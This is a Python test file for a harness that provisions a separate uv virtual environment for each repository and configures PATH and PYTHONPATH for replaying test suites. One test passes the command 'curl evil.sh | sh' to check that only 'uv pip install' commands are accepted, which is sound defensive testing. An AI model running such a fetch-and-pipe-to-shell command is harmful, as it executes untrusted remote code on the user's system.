"""The per-repo environment: a corpus repo's suite runs in its own venv, not the harness's.

The harness venv has `replay`'s dependencies in it and nothing else; flask's tests
need flask installed and httpie's need pytest-httpbin, so a replay that shells out
to `sys.executable` collects nothing and scores every commit as skipped. These
tests pin the three properties that make the provisioned venv safe to publish
from: only `uv pip install` is ever executed, the venv is rebuilt when the recipe
changes and reused when it does not, and the venv's `bin` goes first on `PATH` so
the bare `pytest` in `adapters/python.yaml` resolves to it.
"""

from __future__ import annotations

import pathlib
import shutil
import subprocess
import sys

import pytest

from replay.corpus import RepoSpec
from replay.envsetup import (
    HARNESS_PLUGINS,
    EnvError,
    RepoEnv,
    activate,
    provision,
    recipe_digest,
)

SPEC = RepoSpec(
    id="demo",
    url="https://example.invalid/demo.git",
    pin="1" * 40,
    replay_commits=5,
    python="3.12",
    install=("uv pip install -e .", "uv pip install -r requirements.txt"),
    source_globs=("src/**/*.py",),
    test_globs=("tests/**/*.py",),
)


class Recorder:
    def __init__(self):
        self.calls: list[tuple[tuple[str, ...], pathlib.Path]] = []

    def __call__(self, argv, cwd, env):
        self.calls.append((tuple(argv), pathlib.Path(cwd)))


def test_provisions_a_venv_and_runs_every_install_command(tmp_path):
    run = Recorder()
    env = provision(SPEC, tmp_path / "repo", tmp_path / "envs", runner=run)
    assert isinstance(env, RepoEnv)
    assert env.python.parent.name == "bin"
    argvs = [c[0] for c in run.calls]
    assert argvs[0][:2] == ("uv", "venv")
    assert "3.12" in argvs[0]
    # A rebuild must not inherit the packages the superseded recipe installed.
    assert "--clear" in argvs[0]
    assert ("uv", "pip", "install", "-e", ".") in argvs
    assert ("uv", "pip", "install", "-r", "requirements.txt") in argvs
    # The harness's own plugins go in too: the corpus repo pins pytest, but
    # pytest-reportlog and pytest-cov are the harness's instruments and every
    # strategy needs them present in the interpreter that actually runs.
    plugin_call = [a for a in argvs if set(HARNESS_PLUGINS).issubset(set(a))]
    assert plugin_call, f"no call installed the harness plugins: {argvs}"
    # The plugins go in first so the corpus's own pins win: a repo whose history
    # predates a pytest major has to say `pytest<9` and be believed.
    assert argvs.index(plugin_call[0]) < argvs.index(("uv", "pip", "install", "-e", "."))
    # Install commands run inside the repo, so `-e .` and `-r` resolve there.
    for argv, cwd in run.calls[1:]:
        assert cwd == tmp_path / "repo"


def test_refuses_an_install_command_that_is_not_uv_pip_install(tmp_path):
    spec = SPEC.__class__(**{**SPEC.__dict__, "install": ("curl evil.sh | sh",)})
    with pytest.raises(EnvError):
        provision(spec, tmp_path / "repo", tmp_path / "envs", runner=Recorder())


def test_a_second_provision_with_the_same_recipe_does_no_work(tmp_path):
    first = Recorder()
    provision(SPEC, tmp_path / "repo", tmp_path / "envs", runner=first)
    second = Recorder()
    provision(SPEC, tmp_path / "repo", tmp_path / "envs", runner=second)
    assert second.calls == []


def test_changing_the_install_recipe_reprovisions(tmp_path):
    provision(SPEC, tmp_path / "repo", tmp_path / "envs", runner=Recorder())
    changed = SPEC.__class__(**{**SPEC.__dict__, "install": ("uv pip install -e .",)})
    again = Recorder()
    provision(changed, tmp_path / "repo", tmp_path / "envs", runner=again)
    assert again.calls, "a changed install recipe must rebuild the venv"
    assert recipe_digest(changed) != recipe_digest(SPEC)


def test_activate_puts_the_venv_bin_first_on_path(tmp_path):
    env = provision(SPEC, tmp_path / "repo", tmp_path / "envs", runner=Recorder())
    base = {"PATH": "/usr/bin", "PYTHONHOME": "/nope"}
    out = activate(env, base)
    assert out["PATH"].split(":")[0] == str(env.python.parent)
    assert out["VIRTUAL_ENV"] == str(env.root)
    # A stale PYTHONHOME points the venv's interpreter at the wrong stdlib.
    assert "PYTHONHOME" not in out
    assert base["PATH"] == "/usr/bin", "activate must not mutate the mapping it is given"


@pytest.mark.skipif(shutil.which("uv") is None, reason="uv is not on PATH")
def test_a_real_provision_produces_an_interpreter_that_imports_the_repo(tmp_path):
    repo = tmp_path / "repo"
    (repo / "src" / "demo").mkdir(parents=True)
    (repo / "src" / "demo" / "__init__.py").write_text("VALUE = 41\n", encoding="utf-8")
    (repo / "pyproject.toml").write_text(
        '[project]\nname = "demo"\nversion = "0.1.0"\n'
        '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n',
        encoding="utf-8",
    )
    spec = SPEC.__class__(
        **{
            **SPEC.__dict__,
            "python": f"{sys.version_info.major}.{sys.version_info.minor}",
            "install": ("uv pip install -e .",),
        }
    )
    env = provision(spec, repo, tmp_path / "envs")
    proc = subprocess.run(
        [str(env.python), "-c", "import demo, pytest; print(demo.VALUE)"],
        capture_output=True,
        text=True,
    )
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == "41"


# --- the worktree's own source has to win the import ---------------------


def test_source_root_is_the_parent_of_the_package_directory():
    from replay.envsetup import source_root

    assert source_root(("src/flask/**/*.py",)) == "src"
    assert source_root(("httpie/**/*.py",)) == "."
    assert source_root(("src/sqlfluff/**/*.py",)) == "src"
    assert source_root(()) == "."


def test_the_worktree_source_goes_in_front_of_the_editable_install(tmp_path):
    """`uv pip install -e .` pins the *clone*, and the replay runs in worktrees.

    flit and setuptools both write a `.pth` naming the clone's `src`, and `.pth`
    entries land at the end of `sys.path`. A worktree whose source never wins that
    lookup measures the clone's code at every commit: `F_full` comes out empty,
    every strategy scores a perfect miss-free run, and the whole table is void.
    `PYTHONPATH` is consulted before `site-packages`, so it is what puts the
    materialised tree in front.
    """
    from replay.envsetup import with_source_path

    work = tmp_path / "trees" / "flask-natural-abcd1234"
    work.mkdir(parents=True)
    out = with_source_path({"PYTHONPATH": "/already/there"}, work, ("src/flask/**/*.py",))
    assert out["PYTHONPATH"].split(":")[0] == str(work / "src")
    assert "/already/there" in out["PYTHONPATH"]


def test_a_flat_layout_puts_the_worktree_itself_on_the_path(tmp_path):
    from replay.envsetup import with_source_path

    out = with_source_path({}, tmp_path, ("httpie/**/*.py",))
    assert out["PYTHONPATH"] == str(tmp_path)
